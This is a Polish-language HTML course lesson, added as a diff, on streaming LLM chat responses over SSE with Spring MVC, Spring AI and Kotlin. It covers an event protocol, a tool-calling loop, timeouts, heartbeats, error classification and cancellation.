@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2.3 Streaming SSE i UI w React/TS – AI na produkcji</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body data-root="../" data-lesson="2.3">
+<main>
+<p class="meta">Lekcja 2.3 · ok. 70 min</p>
+<h1>Streaming SSE i UI w React/TS</h1>
+<div class="box goals"><span class="label">Cele</span><ul>
+  <li>Zrozumieć, co streaming poprawia (odczucie szybkości), a czego nie (koszt, całkowity czas).</li>
+  <li>Zaprojektować protokół zdarzeń czatu z narzędziami: <code>meta</code>, <code>delta</code>, <code>tool</code>, <code>done</code>, <code>error</code>.</li>
+  <li>Zbudować <code>POST /api/assistant/chat/stream</code> w Spring MVC ze Spring AI: walidacja przed strumieniem, pętla narzędzi, heartbeat, timeouty, anulowanie, zapis tury.</li>
+  <li>Skonfigurować nginx i load balancery tak, by nie buforowały i nie zrywały strumienia.</li>
+  <li>Napisać we froncie parser SSE na <code>fetch</code>, hook <code>useAssistantStream</code> i bezpieczny, dostępny widok odpowiedzi oraz testy.</li>
+</ul></div>
+
+<h2>Dlaczego streaming: TTFT a całkowity czas</h2>
+<p>W lekcji 2.1 <code>POST /api/assistant/chat</code> wracał dopiero z kompletną odpowiedzią. Z 1.5 znasz model opóźnienia: czas ≈ <dfn data-t="ttft">TTFT</dfn> (czas do pierwszego tokenu) + tokeny wyjściowe / prędkość. Czat z narzędziami ma kilka rund: model generuje żądanie narzędzia, backend je wykonuje, druga runda pisze odpowiedź.</p>
+<table>
+  <tr><th>Etap (pytanie „jaki jest status HD-1042?”)</th><th>Czas</th><th>Ze streamingiem użytkownik widzi</th></tr>
+  <tr><td>Runda 1: TTFT + żądanie <code>getTicket</code></td><td>1,2 s</td><td>„Sprawdzam zgłoszenie…”</td></tr>
+  <tr><td>Narzędzie (SQL przez <code>TicketApi</code>)</td><td>0,1 s</td><td>wskaźnik narzędzia</td></tr>
+  <tr><td>Runda 2: TTFT (dłuższy prompt)</td><td>1,0 s</td><td>pierwsze słowa po 2,3 s</td></tr>
+  <tr><td>250 tokenów po 80 tok/s</td><td>3,1 s</td><td>tekst „pisze się”; bez streamingu całość naraz po 5,4 s</td></tr>
+</table>
+<p>Całkowity czas i koszt są te same: płacisz za te same <dfn data-t="token">tokeny</dfn>. <dfn data-t="streaming">Streaming</dfn> zmienia tylko moment pierwszej informacji, ale to wystarcza: ok. 1 s to granica płynnej interakcji, a po ok. 10 s ciszy użytkownik przełącza się na coś innego. Dochodzą dwie zalety techniczne: <strong>anulowanie</strong> (przycisk „Zatrzymaj” kończy generowanie u dostawcy, więc nie płacisz za resztę) i <strong>szybkie wykrycie zawieszenia</strong> (kilka sekund ciszy zamiast minutowego timeoutu).</p>
+<div class="box warn"><span class="label">Kiedy NIE streamować</span><p>Gdy wynik czyta kod (triage, ekstrakcja, <dfn data-t="structured-output">structured output</dfn> z 5.2: niepełnego JSON-a nie pokażesz ani nie zwalidujesz), przy krótkich odpowiedziach (tak/nie), w zadaniach w tle i wtedy, gdy odpowiedź trzeba sprawdzić przed pokazaniem. Streaming pokazuje tekst, zanim zobaczysz całość; tę cenę płacisz przy filtrze treści.</p></div>
+
+<h2>SSE, WebSocket czy fetch ze strumieniem</h2>
+<p><dfn data-t="sse">SSE (Server-Sent Events)</dfn> to jednokierunkowy strumień zdarzeń z serwera w zwykłej odpowiedzi HTTP typu <code>text/event-stream</code>. <dfn data-t="websocket">WebSocket</dfn> to osobny protokół: po „uaktualnieniu” połączenia HTTP obie strony wysyłają wiadomości w dowolnym momencie. Trzecia opcja to <code>fetch</code>, którego odpowiedź czytasz przyrostowo jako <code>ReadableStream</code> (strumień bajtów dostępnych w miarę nadchodzenia).</p>
+<table>
+  <tr><th>Cecha</th><th><code>EventSource</code> (SSE)</th><th>WebSocket</th><th><code>fetch</code> + format SSE</th></tr>
+  <tr><td>Metoda i body</td><td>tylko GET</td><td>wiadomości w obie strony</td><td>POST z JSON-em</td></tr>
+  <tr><td>Nagłówek <code>Authorization</code></td><td>nie (tylko ciasteczka)</td><td>nie w handshake z przeglądarki</td><td>tak</td></tr>
+  <tr><td>Automatyczne ponowienie</td><td>tak, samo</td><td>nie</td><td>nie, decydujesz Ty</td></tr>
+  <tr><td>Proxy i load balancery</td><td>zwykłe HTTP</td><td>obsługa <code>Upgrade</code> na każdym elemencie</td><td>zwykłe HTTP</td></tr>
+  <tr><td>Kiedy</td><td>publiczne powiadomienia</td><td>edycja współdzielona, czat między ludźmi</td><td><strong>czat z LLM</strong></td></tr>
+</table>
+<p>Czat to „pytanie → strumień odpowiedzi”, więc dwukierunkowość WebSocketu nic nie daje, a kosztuje osobne uwierzytelnienie i konfigurację infrastruktury. <code>EventSource</code> odpada, bo pytanie (do 4000 znaków) i token musiałyby iść w URL, który ląduje w logach nginx (dane osobowe w logach to błąd #5 z 2.7), a samoczynne ponowienie po zerwaniu oznacza drugie płatne pytanie i inną odpowiedź doklejoną do połowy pierwszej. Zostaje format SSE z własnym parserem na <code>fetch</code>; tak samo robią SDK dostawców LLM.</p>
+<h3>Format SSE na drucie</h3>
+<p>Strumień to tekst UTF-8 w liniach <code>pole: wartość</code>; pusta linia kończy zdarzenie. Pola: <code>event</code> (typ, domyślnie <code>message</code>), <code>data</code> (kilka linii łączy się znakiem nowej linii), <code>id</code> i <code>retry</code> (dla ponownego łączenia <code>EventSource</code>, nie używamy). Linia od dwukropka to komentarz. Parser musi obsłużyć końce linii <code>\n</code>, <code>\r\n</code> i samo <code>\r</code>, usunąć jedną spację po dwukropku (Spring pisze <code>data:</code> bez spacji), zignorować nieznane pola i odrzucić niedokończone zdarzenie na końcu. Najważniejsze: <strong>granice kawałków sieciowych nie pokrywają się z granicami zdarzeń ani znaków UTF-8</strong>. Jeden odczyt może dać pół linii, trzy zdarzenia albo połowę litery „ł”.</p>
+
+<h2>Protokół zdarzeń czatu: ChatEvent</h2>
+<p>UI potrzebuje więcej niż tekstu: ID rozmowy, informacji, że model sprawdza zgłoszenie, powodu zakończenia i tego, czy błąd warto ponowić. Definiujemy zamknięty zbiór zdarzeń jako <code>sealed interface</code> (ustalona lista implementacji, <code>when</code> sprawdza kompletność):</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/stream/ChatEvent.kt">
+  sealed interface ChatEvent {
+      /** Zawsze pierwsze: potwierdza przyjęcie pytania. */
+      data class Meta(val conversationId: UUID, val model: String, val promptVersion: String) : ChatEvent
+      /** Fragment tekstu do doklejenia. */
+      data class Delta(val text: String) : ChatEvent
+      /** Postęp narzędzia: nazwa i wynik, nigdy argumenty ani dane. */
+      data class Tool(val name: String, val status: ToolStatus, val ok: Boolean? = null) : ChatEvent
+      /** Normalny koniec; usage = suma wszystkich rund. */
+      data class Done(val finishReason: FinishReason, val usage: StreamUsage?) : ChatEvent
+      /** Błąd po otwarciu strumienia; zawsze ostatnie zdarzenie. */
+      data class Error(val code: ChatErrorCode, val message: String, val retryable: Boolean, val traceId: String? = null) : ChatEvent
+  }
+
+  enum class ToolStatus { @JsonProperty("started") STARTED, @JsonProperty("finished") FINISHED }
+  data class StreamUsage(val inputTokens: Int, val outputTokens: Int)
+  enum class ChatErrorCode { TIMEOUT, RATE_LIMITED, MODEL_UNAVAILABLE, CONTEXT_TOO_LONG,
+                             CONTENT_FILTERED, TOOL_ROUNDS_EXCEEDED, INTERRUPTED, INTERNAL }
+
+  /** Rozszerzenie, nie właściwość interfejsu: Jackson nie dopisze go do JSON-a. */
+  val ChatEvent.sseName get() = when (this) {
+      is ChatEvent.Meta -> "meta"; is ChatEvent.Delta -> "delta"; is ChatEvent.Tool -> "tool"
+      is ChatEvent.Done -> "done"; is ChatEvent.Error -> "error"
+  }
+  fun ChatEvent.toSse(): ServerSentEvent<ChatEvent> = ServerSentEvent.builder<ChatEvent>(this).event(sseName).build()
+</script>
+<p><code>FinishReason</code> to enum z 1.2, znormalizowany <dfn data-t="finish-reason"><code>finish_reason</code></dfn>. Strumień na pytanie Anny z Acme:</p>
+<script type="text/x-code" data-lang="plaintext" data-title="text/event-stream">
+  event:meta
+  data:{"conversationId":"5b1e2c7a-…","model":"helpdesk-default","promptVersion":"v3"}
+
+  event:tool
+  data:{"name":"getTicket","status":"started","ok":null}
+
+  :ping
+
+  event:tool
+  data:{"name":"getTicket","status":"finished","ok":true}
+
+  event:delta
+  data:{"text":"Zgłoszenie HD-1042 ma status **W realizacji**."}
+
+  event:done
+  data:{"finishReason":"STOP","usage":{"inputTokens":2310,"outputTokens":96}}
+</script>
+<ul>
+  <li><strong><code>meta</code> zawsze pierwsze</strong>: daje <code>conversationId</code> nowej rozmowy (2.5) i od razu wypycha nagłówki, więc klient wie, że pytanie przyjęto.</li>
+  <li><strong>Dokładnie jedno zdarzenie końcowe</strong>: <code>done</code> albo <code>error</code>. Strumień bez nich to zerwanie po drodze.</li>
+  <li><strong><code>tool</code> bez danych</strong>: argumenty wygenerował model i mogą zawierać ID wstrzyknięte przez atakującego (<dfn data-t="prompt-injection">prompt injection</dfn>, 3.4), a wyniki są dla modelu, nie dla UI.</li>
+  <li><strong>JSON w <code>data</code></strong>, także dla tekstu: Jackson zamienia znaki nowej linii na <code>\n</code>, więc każde zdarzenie ma jedną linię <code>data:</code>.</li>
+  <li><strong>Nieznane typy klient ignoruje</strong>: w module 3 dojdzie zdarzenie potwierdzenia akcji bez łamania otwartych kart ze starszym frontem.</li>
+</ul>
+
+<h2>Spring MVC czy WebFlux</h2>
+<p>Spring MVC działa na servletach (Tomcat) z wątkiem na żądanie. WebFlux jest reaktywny: nieblokująca pętla zdarzeń (Netty), cały kod, łącznie z bazą, nie może blokować wątków. Oba używają <dfn data-t="reactor-flux">Project Reactor</dfn>: <code>Flux&lt;T&gt;</code> to strumień 0..N elementów, <code>Mono&lt;T&gt;</code> 0..1. Strumień nic nie robi, dopóki ktoś go nie <em>subskrybuje</em>; subskrybent może subskrypcję <em>anulować</em>, a anulowanie płynie w górę łańcucha do źródła.</p>
+<p>HelpDesk stoi na MVC (1.1, 1.2) z JPA, RLS przez <code>TenantSession</code> w transakcjach i wątkami wirtualnymi. Spring AI wywołuje model strumieniowo reaktywnym <code>WebClient</code>, więc moduł OpenAI ciągnie <code>spring-webflux</code>; przy obu stosach Boot uruchamia MVC, a WebFlux jest tylko biblioteką klienta. Opcje:</p>
+<ul>
+  <li><strong>Migracja na WebFlux</strong>: przepisanie RLS, JPA, security i testów dla jednego endpointu. Nie.</li>
+  <li><strong>MVC + <code>SseEmitter</code></strong>: sam subskrybujesz <code>Flux</code> i obsługujesz <code>onCompletion</code>/<code>onTimeout</code>/<code>onError</code>; łatwo o wyciek subskrypcji, która dalej płaci za tokeny. Tylko dla źródeł niereaktywnych.</li>
+  <li><strong>MVC + kontroler zwracający <code>Flux&lt;ServerSentEvent&gt;</code></strong>: Spring przełącza żądanie w tryb asynchroniczny servletu (wątek wraca do puli), subskrybuje, zapisuje zdarzenia i anuluje przy rozłączeniu. <strong>Wybieramy to.</strong></li>
+</ul>
+<p>Dwie pułapki konfiguracji. <code>spring.mvc.async.request-timeout</code> domyślnie nie jest ustawiony, więc obowiązuje limit kontenera, w Tomcacie 30 s: dłuższa odpowiedź zostanie ucięta w pół zdania. Zapis do odpowiedzi servletu jest blokujący, więc Spring robi go przez executor async MVC; bez niego w logach pojawia się ostrzeżenie, że <code>SimpleAsyncTaskExecutor</code> nie nadaje się pod obciążenie. Przy <dfn data-t="virtual-threads">wątkach wirtualnych</dfn> z 1.2 Boot używa executora na nich (sprawdź w swojej wersji), bez nich ustaw pulę <code>spring.task.execution.pool.*</code>.</p>
+<script type="text/x-code" data-lang="yaml" data-title="application.yml">
+  spring:
+    threads.virtual.enabled: true        # 1.2
+    reactor.context-propagation: auto    # 1.4: trace i MDC w operatorach Reactora
+    mvc.async.request-timeout: 120s      # > total-timeout; domyślnie limit Tomcata 30 s
+
+  helpdesk.assistant:
+    max-tool-rounds: 5                   # kontrakt M2 (2.1)
+    stream:                              # AssistantStreamProperties (@ConfigurationProperties)
+      first-token-timeout: 10s           # TTFT jednej rundy (1.5)
+      idle-timeout: 15s                  # maks. przerwa między fragmentami
+      tools-timeout: 10s
+      total-timeout: 90s
+      heartbeat: 15s
+      max-concurrent: 50                 # strumienie na instancję
+      max-per-user: 2
+</script>
+
+<h2>Narzędzia w strumieniu Spring AI</h2>
+<p>W API dostawcy żądanie <dfn data-t="tool-calling">narzędzia</dfn> też przychodzi kawałkami: nazwa w jednym fragmencie, argumenty JSON pocięte na kilkanaście. Spring AI 1.x (moduł OpenAI, kod gałęzi 1.1) robi tak:</p>
+<ol>
+  <li><code>OpenAiApi.chatCompletionStream</code> skleja fragmenty wywołania narzędzia (<code>windowUntil</code> + <code>reduce</code>) w <strong>jeden</strong> fragment z kompletnym żądaniem; tekst przechodzi bez zmian.</li>
+  <li>W trybie domyślnym <code>OpenAiChatModel</code> nie przekazuje tego fragmentu dalej, tylko wykonuje narzędzia przez <code>ToolCallingManager</code> na schedulerze <code>boundedElastic</code> (pula Reactora do pracy blokującej) i rekurencyjnie otwiera kolejny strumień.</li>
+  <li><code>ChatClient.stream()</code> widzi więc tylko tekst. Dokumentacja 1.1: wiadomości wymieniane z modelem przy narzędziach nie są udostępniane; jeśli ich potrzebujesz, użyj wykonania sterowanego przez użytkownika.</li>
+</ol>
+<p>Tryb domyślny nie da zdarzeń <code>tool</code>, limitu 5 rund ani <code>ToolCallSummary</code> do zapisu tury. Wyłączamy go opcją <code>internalToolExecutionEnabled(false)</code>: fragment z żądaniem trafia wtedy do nas, a pętlę prowadzimy według wzorca z dokumentacji:</p>
+<script type="text/x-code" data-lang="kotlin" data-title="wzorzec z dokumentacji Spring AI 1.1 (blokujący)">
+  var response = chatModel.call(prompt)
+  while (response.hasToolCalls()) {
+      val result: ToolExecutionResult = toolCallingManager.executeToolCalls(prompt, response)
+      prompt = Prompt(result.conversationHistory(), prompt.options)   // historia + wyniki narzędzi
+      response = chatModel.call(prompt)
+  }
+</script>
+<p><code>executeToolCalls</code> bierze narzędzia i <code>ToolContext</code> z opcji promptu, wykonuje wszystkie wywołania i zwraca historię z wiadomością asystenta i <code>ToolResponseMessage</code>. Linia 1.1 ma też <code>ToolCallAdvisor</code>, a nowsze linie przeniosły pętlę do advisora i zmieniły nazwy przełączników; przy innym module niż OpenAI sprawdź testem WireMock, że dostajesz jeden kompletny fragment z <code>hasToolCalls() == true</code>.</p>
+
+<h2>Najpierw walidacja, potem strumień</h2>
+<p>Gdy pierwsze zdarzenie poleci do klienta, status 200 jest wysłany i każdy późniejszy problem może być tylko zdarzeniem <code>error</code>. Dlatego wszystko, co da się sprawdzić bez modelu, sprawdzamy synchronicznie <em>przed</em> zwróceniem <code>Flux</code>, w kolejności z kontraktu M2: walidacja body (400), <code>tenants.get(user, tenantId)</code> (404), <code>availability.require</code> (403/503, 1.5), <code>router.route(tenantId, CHAT)</code> (Globex: 403 <dfn data-t="problem-detail">ProblemDetail</dfn> <code>assistant-disabled</code> z <code>reason</code>), limiter (429), właściciel rozmowy (404, 2.5), limit strumieni (429/409). Globex dostaje zwykłe 403, model nie dostaje ani tokenu. Ta sama metoda służy synchronicznemu <code>chat()</code> z 2.1:</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/AssistantChatService.kt (przygotowanie)">
+  data class PreparedChat(
+      val user: CurrentUser, val tenantId: UUID, val conversationId: UUID,
+      val route: ModelRoute.Use, val prompt: PromptVersion, val message: String,
+      val traceId: String?,                                            // odczytany w wątku żądania (1.4)
+  )
+
+  fun prepare(user: CurrentUser, req: ChatRequest): PreparedChat {
+      tenants.get(user, req.tenantId)                                  // 404
+      availability.require(req.tenantId)                               // 403/503
+      val route = when (val r = router.route(req.tenantId, AiTask.CHAT)) {
+          is ModelRoute.Disabled -> throw AssistantChatDisabledException(r.reason)  // 403 (2.1)
+          is ModelRoute.Use -> r
+      }
+      limiter.acquire(user, req.tenantId, estimateTokens(req.message.length, props.maxOutputTokens))  // 429
+      val conversationId = req.conversationId ?: UUID.randomUUID()     // 2.5: ConversationStore sprawdzi właściciela
+      return PreparedChat(user, req.tenantId, conversationId, route, prompts.get("assistant-chat"),
+          req.message.trim(), tracer.currentSpan()?.context()?.traceId())
+  }
+</script>
+<div class="box warn"><span class="label">Pułapka: ProblemDetail a Accept</span><p>Endpoint ma <code>produces = text/event-stream</code>. Gdy poleci wyjątek, <code>ProblemDetail</code> trzeba zapisać jako <code>application/problem+json</code>, o który klient z <code>Accept: text/event-stream</code> nie prosił. Nowsze wersje Springa mają na to obejście, ale nie polegaj na nim: frontend wysyła <code>Accept: text/event-stream, application/problem+json</code>, a test sprawdza, że Globex dostaje 403 z JSON-em, a nie puste 406 lub 500.</p></div>
+
+<h2>Pętla strumienia z narzędziami</h2>
+<p>Struktura: <code>meta</code>, runda modelu, a jeśli runda skończyła się żądaniem narzędzi: <code>tool started</code>, wykonanie, <code>tool finished</code> i kolejna runda; jeśli tekstem: <code>done</code>. Operatory: <code>Flux.defer</code> tworzy strumień przy subskrypcji (każda dostaje własny stan), <code>concatWith</code> dokleja strumień po zakończeniu poprzedniego, <code>doOnNext</code>/<code>doFinally</code> podglądają element i zakończenie z dowolnej przyczyny.</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/AssistantChatService.kt (strumień)">
+  fun stream(user: CurrentUser, req: ChatRequest): Flux<ChatEvent> {
+      val chat = prepare(user, req)                                   // wyjątki → ProblemDetail
+      val permit = streamGuard.acquire(user.userId, chat.conversationId)   // 429/409
+      return Flux.defer {
+          val s = StreamState(chat, clock.millis())
+          val deadline = Mono.delay(limits.totalTimeout).doOnNext { s.deadlineHit = true }
+          Flux.just<ChatEvent>(ChatEvent.Meta(chat.conversationId, chat.route.alias, chat.prompt.version))
+              .concatWith(modelRound(s, initialPrompt(chat), round = 1))
+              .takeUntilOther(deadline)                               // limit całkowity: anuluje źródło
+              .concatWith(Flux.defer {
+                  if (s.deadlineHit) Flux.just(StreamErrors.toEvent(TimeoutException(), chat.traceId)) else Flux.empty()
+              })
+              .onErrorResume { e -> Flux.just(StreamErrors.toEvent(e, chat.traceId)) }
+              .doOnNext { s.record(it, clock.millis()) }
+              .doFinally { signal -> finishTurn(s, signal, permit) }
+      }
+  }
+
+  private fun initialPrompt(c: PreparedChat): Prompt {
+      val options = OpenAiChatOptions.builder()
+          .model(c.route.alias).temperature(props.temperature).maxTokens(props.maxOutputTokens)
+          .streamUsage(true)                                          // usage w ostatnim fragmencie
+          .toolCallbacks(ToolCallbacks.from(ticketTools).toList())    // TicketReadTools z 2.1
+          .toolContext(mapOf(AssistantToolContext.KEY to AssistantToolContext(c.user, c.tenantId, c.route, c.conversationId)))
+          .internalToolExecutionEnabled(false)                       // pętlę prowadzimy sami
+          .build()
+      return Prompt(listOf(SystemMessage(systemPrompt.render(c)), UserMessage(userBlock(c.message))), options)  // 2.4, 2.5
+  }
+
+  private fun modelRound(s: StreamState, prompt: Prompt, round: Int): Flux<ChatEvent> = Flux.defer {
+      val r = RoundState()
+      clients.forRoute(s.chat.route).prompt(prompt).stream().chatResponse()
+          .timeout(Mono.delay(limits.firstTokenTimeout)) { Mono.delay(limits.idleTimeout) }  // TTFT, potem bezczynność
+          .transformDeferred(CircuitBreakerOperator.of(breaker))      // breaker "llm" z 1.5
+          .concatMapIterable { r.consume(it) }                        // 0 lub 1 zdarzenie na fragment
+          .concatWith(Flux.defer {
+              s.addUsage(r.usage)
+              val call = r.toolCallResponse
+              when {
+                  call != null -> runTools(s, prompt, call, round)
+                  r.finish == null -> Flux.error(StreamInterruptedException())   // koniec bez finish_reason
+                  else -> Flux.just(ChatEvent.Done(r.finish!!, s.usage()))
+              }
+          })
+  }
+
+  private fun runTools(s: StreamState, prompt: Prompt, response: ChatResponse, round: Int): Flux<ChatEvent> {
+      if (round > props.maxToolRounds) return Flux.just(ChatEvent.Error(ChatErrorCode.TOOL_ROUNDS_EXCEEDED,
+          "Pytanie wymaga zbyt wielu kroków. Zapytaj o jedno zgłoszenie naraz.", false, s.chat.traceId))
+      val started = response.results.flatMap { it.output.toolCalls }.map { ChatEvent.Tool(it.name(), ToolStatus.STARTED) }
+      val execution = Mono.fromCallable { toolCalling.executeToolCalls(prompt, response) }
+          .subscribeOn(Schedulers.boundedElastic())                   // JDBC blokuje: nie na wątku Netty
+          .timeout(limits.toolsTimeout)
+          .flatMapMany { result ->
+              val finished = (result.conversationHistory().last() as ToolResponseMessage).responses.map { tr ->
+                  val ok = toolOutcome.isOk(tr.responseData())        // "status":"error" w JSON ToolResult = błąd (2.1)
+                  s.toolCalls += ToolCallSummary(tr.name(), ok, durationMs = 0)   // czas: span tool_call (1.4)
+                  ChatEvent.Tool(tr.name(), ToolStatus.FINISHED, ok)
+              }
+              Flux.fromIterable<ChatEvent>(finished)
+                  .concatWith(modelRound(s, Prompt(result.conversationHistory(), prompt.options), round + 1))
+          }
+      return Flux.fromIterable<ChatEvent>(started).concatWith(execution)
+  }
+</script>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/stream/RoundState.kt">
+  /** Stan jednej rundy, osobny dla każdej subskrypcji. */
+  internal class RoundState {
+      var toolCallResponse: ChatResponse? = null
+      var finish: FinishReason? = null
+      var usage: Usage? = null
+
+      fun consume(chunk: ChatResponse): List<ChatEvent> {
+          chunk.metadata.usage?.takeIf { (it.promptTokens ?: 0) > 0 }?.let { usage = it }   // ostatnie niezerowe
+          val gen = chunk.result ?: return emptyList()                // fragment tylko z usage
+          gen.metadata.finishReason?.takeIf { it.isNotBlank() }?.let { finish = FinishReason.from(it) }
+          if (gen.output.hasToolCalls()) { toolCallResponse = chunk; return emptyList() }   // sklejone żądanie
+          val text = gen.output.text
+          return if (text.isNullOrEmpty()) emptyList() else listOf(ChatEvent.Delta(text))
+      }
+  }
+</script>
+<ul>
+  <li><strong>Brak <code>finish_reason</code> to błąd.</strong> Gdy LiteLLM zamknie połączenie w połowie, <code>WebClient</code> po prostu kończy strumień. Bez tej kontroli wysłałbyś <code>done</code> z uciętą odpowiedzią.</li>
+  <li><strong>Tekst przed narzędziem</strong> („Sprawdzę to zgłoszenie.”) to zwykłe <code>delta</code>; odpowiedź dokleja się za nim.</li>
+  <li><strong>Narzędzia na <code>boundedElastic</code></strong>: fragmenty przychodzą na wątku pętli zdarzeń Reactor Netty, a zablokowanie go zapytaniem SQL wstrzymałoby inne strumienie.</li>
+  <li><strong>Limit rund w kodzie</strong>: szósta prośba o narzędzie kończy się <code>error</code> z <code>retryable: false</code>. Pełna <dfn data-t="agent-loop">pętla agenta</dfn> z budżetem to 3.2.</li>
+  <li><strong>Bez <code>@Transactional</code> na strumieniu</strong>: transakcja trzymana 20 s przy 50 rozmowach wyczerpie pulę połączeń. Każde narzędzie ma krótką transakcję w <code>TicketApi</code> z <code>TenantSession.bind</code>.</li>
+</ul>
+
+<h2>Kontroler, nagłówki i heartbeat</h2>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/web/AssistantChatController.kt">
+  @PostMapping("/api/assistant/chat/stream", produces = [MediaType.TEXT_EVENT_STREAM_VALUE])
+  fun stream(user: CurrentUser, @Valid @RequestBody req: ChatRequest): ResponseEntity<Flux<ServerSentEvent<ChatEvent>>> {
+      val events = service.stream(user, req)                          // tu: 4xx/5xx jako ProblemDetail
+      return ResponseEntity.ok()
+          .header("X-Accel-Buffering", "no")                          // nginx: nie buforuj tej odpowiedzi
+          .header(HttpHeaders.CACHE_CONTROL, "no-cache, no-transform")
+          .body(events.map { it.toSse() }.withHeartbeat(limits.heartbeat))
+  }
+
+  /** publish { } subskrybuje źródło RAZ; ping kończy się razem ze źródłem. */
+  fun <T : Any> Flux<ServerSentEvent<T>>.withHeartbeat(every: Duration): Flux<ServerSentEvent<T>> =
+      publish { shared ->
+          Flux.merge(shared, Flux.interval(every, every)
+              .map { ServerSentEvent.builder<T>().comment("ping").build() }
+              .takeUntilOther(shared.then()))
+      }
+</script>
+<p><dfn data-t="heartbeat">Heartbeat</dfn> (sygnał „żyję” w stałych odstępach) jest komentarzem SSE: parser go ignoruje, ale bajty płyną. Rozwiązuje trzy problemy: timeouty bezczynności po drodze (nginx <code>proxy_read_timeout</code> domyślnie 60 s, AWS ALB 60 s) przy długim TTFT; wykrywanie rozłączenia (Tomcat dowiaduje się o nim dopiero przy nieudanym zapisie); wykrywanie zawieszenia przez klienta (brak bajtów przez 35 s = martwe połączenie). Heartbeat jest doklejany <em>za</em> timeoutami serwisu; przed nimi każdy ping resetowałby licznik bezczynności i zawieszony model nigdy nie dostałby timeoutu.</p>
+
+<h2>Błędy w trakcie i timeouty</h2>
+<p>Po otwarciu strumienia błąd jest zdarzeniem <code>error</code>. Klasyfikacja decyduje o komunikacie i ponowieniu:</p>
+<script type="text/x-code" data-lang="kotlin" data-title="assistant/stream/StreamErrors.kt">
+  object StreamErrors {
+      fun toEvent(e: Throwable, traceId: String?): ChatEvent.Error {
+          val (code, retryable) = when {
+              generateSequence(e) { it.cause }.any { it is PrematureCloseException } -> ChatErrorCode.INTERRUPTED to true
+              e is StreamInterruptedException -> ChatErrorCode.INTERRUPTED to true
+              e is TimeoutException -> ChatErrorCode.TIMEOUT to true
+              e is CallNotPermittedException -> ChatErrorCode.MODEL_UNAVAILABLE to true    // otwarty breaker
+              e is WebClientResponseException -> when {
+                  e.statusCode.value() == 429 -> ChatErrorCode.RATE_LIMITED to true
+                  "ContextWindowExceeded" in e.responseBodyAsString -> ChatErrorCode.CONTEXT_TOO_LONG to false
+                  "content_filter" in e.responseBodyAsString -> ChatErrorCode.CONTENT_FILTERED to false
+                  e.statusCode.is5xxServerError -> ChatErrorCode.MODEL_UNAVAILABLE to true
+                  else -> ChatErrorCode.INTERNAL to false
+              }
+              e is WebClientRequestException -> ChatErrorCode.MODEL_UNAVAILABLE to true    // brak połączenia z proxy
+              else -> ChatErrorCode.INTERNAL to true
+          }
+          log.warn("assistant.stream.error code={} type={} traceId={}", code, e.javaClass.simpleName, traceId)  // bez treści
+          return ChatEvent.Error(code, USER_MESSAGES.getValue(code), retryable, traceId)
+      }
+  }
+</script>
+<p>Treść wyjątku nie trafia do klienta (zdradza architekturę i nic nie mówi użytkownikowi), wsparcie ma <code>traceId</code>. W streamingu błąd HTTP od LiteLLM przychodzi jako <code>WebClientResponseException</code>, a nie przez <code>ResponseErrorHandler</code> z 1.5, który dotyczy tylko <code>RestClient</code>; klasyfikację po treści sprawdź testem na odpowiedziach z Twojego LiteLLM.</p>
+<p><strong>Timeouty.</strong> <code>timeout(pierwszy, kolejne)</code> daje limit na pierwszy fragment rundy (TTFT, 10 s) i na każdą przerwę (15 s). Pułapka: <code>Flux.timeout(Duration)</code> to limit <em>między elementami</em>, nie całkowity. Całkowity (90 s) robi <code>takeUntilOther(deadline)</code>: anuluje źródło aż do <code>WebClient</code>, a my doklejamy <code>error TIMEOUT</code>. <dfn data-t="time-budget">Budżet czasu</dfn>: frontend 35 s bez bajtów i 120 s łącznie, nginx 60 s między odczytami, Tomcat async 120 s, backend 90 s.</p>
+<p><strong><code>LENGTH</code></strong>: model doszedł do <dfn data-t="max-tokens"><code>max_tokens</code></dfn>. Tekst jest już na ekranie, więc wysyłamy <code>done LENGTH</code>, a UI dopisuje „odpowiedź skrócona”. Ponowienie z tym samym limitem nic nie da; częste ucięcia to sygnał do zmiany promptu lub limitu (2.6).</p>
+<p><strong><code>CONTENT_FILTER</code> w trakcie</strong>: filtr dostawcy przerwał generowanie po kilku zdaniach, które użytkownik już widzi. Wysyłamy <code>done CONTENT_FILTER</code>, UI <em>zastępuje</em> częściowy tekst neutralnym komunikatem (zasada z 1.2), do historii trafia tylko znacznik, a metryka z tagiem tenanta pokaże falę. Filtr na wejściu (np. Azure OpenAI) daje od razu 400 → <code>CONTENT_FILTERED</code>.</p>
+<p><strong>Breaker</strong>: adnotacje Resilience4j nie obejmują dobrze metod zwracających <code>Flux</code>, dlatego <code>CircuitBreakerOperator</code> z <code>resilience4j-reactor</code>. Anulowanie przez użytkownika nie może liczyć się jako błąd dostawcy (operator powinien wtedy zwolnić pozwolenie bez wyniku; sprawdź w swojej wersji, inaczej klikający „Zatrzymaj” otworzą breaker).</p>
+
+<h2>Anulowanie i kontekst w wątkach Reactora</h2>
+<script type="text/x-code" data-lang="plaintext" data-title="ścieżka anulowania">
+  [Zatrzymaj] AbortController.abort("user")
+    → przeglądarka zamyka strumień HTTP → nginx zamyka połączenie do backendu (proxy_ignore_client_abort off)
+    → Tomcat: najbliższy zapis (delta albo ping) kończy się błędem I/O → Spring MVC anuluje subskrypcję
+    → cancel w górę: heartbeat → takeUntilOther → timeout → WebClient → Reactor Netty zamyka połączenie
+    → LiteLLM zamyka strumień do dostawcy → dostawca przestaje generować
+    → doFinally(CANCEL): tura z outcome = CANCELLED, zwolnienie limitu strumieni
+</script>
